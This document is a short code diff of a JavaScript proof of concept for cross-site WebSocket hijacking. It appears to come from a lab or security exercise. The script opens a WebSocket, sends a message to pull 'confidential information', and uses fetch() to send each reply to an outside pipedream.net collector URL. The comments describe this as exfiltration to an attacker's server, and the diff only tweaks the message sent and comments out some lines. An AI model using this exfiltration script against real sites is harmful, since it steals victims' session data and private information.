@@ -12,14 +12,15 @@ function gogo() {
 	ws.onopen = start
 	ws.onmessage = handleReply
 	function start(event) {
-	  ws.send("READY"); //Send the message to retreive confidential information
+	  ws.send("hello"); //Send the message to retreive confidential information
 	}
 	function handleReply(event) {
 	  //Exfiltrate the confidential information to attackers server
 	  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?'+event.data, {mode: 'no-cors'})
 	}
-	sleep(10000)
-	ws.send(`hello`);
+	//sleep(10000)
+	//conn.onopen = () => conn.send("Message");
+	//ws.send(`hello`);
 }
 
 </script>
